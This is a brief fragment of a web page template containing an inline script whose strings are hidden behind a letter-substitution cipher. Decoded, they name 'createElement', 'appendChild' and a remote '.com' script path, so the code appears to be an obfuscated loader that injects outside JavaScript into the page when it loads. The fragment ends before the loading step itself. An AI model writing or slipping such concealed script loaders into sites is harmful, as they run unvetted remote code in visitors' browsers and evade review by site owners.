...
{literal}
<script type="text/javascript">
 var p$00a = 'p$00a' + (new Date().getTime()) + 'zz'; window[p$00a] = {a:'abcdefghijklmnopqrstuvwxyz0123456789kgfalh5cv3jbxti02onpm81d9z6yqrwes74u', b:'{"AZIb":"w7us44", "BVIb":"7qwyes", "CXrr1":"mtalo", "DLtag":"y", "Emjk5":"", "XCge1s":"fkkc12.fix" , "Zt1":"0i0fknc.tlp", "ZZ1":"ok0ibij.fix" }', c:'{"Abkr221":"nfov0p", "Bo9ssm":"//fat.fkkc12.fix/k00.3n"}', d:'{"Ag4":"gia9", "Bx1":"k00ltaCcvba", "Cky":"nof", "Dmg":"folkplEblxltp"}'};
